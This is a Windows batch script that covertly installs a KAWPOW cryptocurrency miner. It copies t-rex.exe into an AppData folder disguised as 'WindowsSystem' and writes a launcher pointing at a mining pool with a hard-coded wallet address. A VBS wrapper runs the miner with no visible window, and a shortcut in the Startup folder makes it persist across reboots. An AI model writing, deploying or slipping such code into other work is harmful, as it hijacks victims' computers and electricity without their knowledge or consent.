@echo off
setlocal

:: Define hidden install directory
set "INSTALL_DIR=%APPDATA%\WindowsSystem"
set "MINER_EXE=t-rex.exe"
set "MINER_SCRIPT=%INSTALL_DIR%\miner.bat"
set "VBS_SCRIPT=%INSTALL_DIR%\run_hidden.vbs"
set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"

:: Ensure hidden directory exists
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Copy miner executable to hidden location
copy "%~dp0%MINER_EXE%" "%INSTALL_DIR%\%MINER_EXE%" /Y >nul 2>&1

:: Create the miner script
(
echo @echo off
echo cd /d "%INSTALL_DIR%"
echo :loop
echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop)
echo start /b "%INSTALL_DIR%\%MINER_EXE%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
) > "%MINER_SCRIPT%"

:: Create a VBS script to run miner silently
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run """%MINER_SCRIPT%""", 0, False
) > "%VBS_SCRIPT%"

:: Create startup shortcut
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"

:: Run miner immediately in background
wscript "%VBS_SCRIPT%"

exit
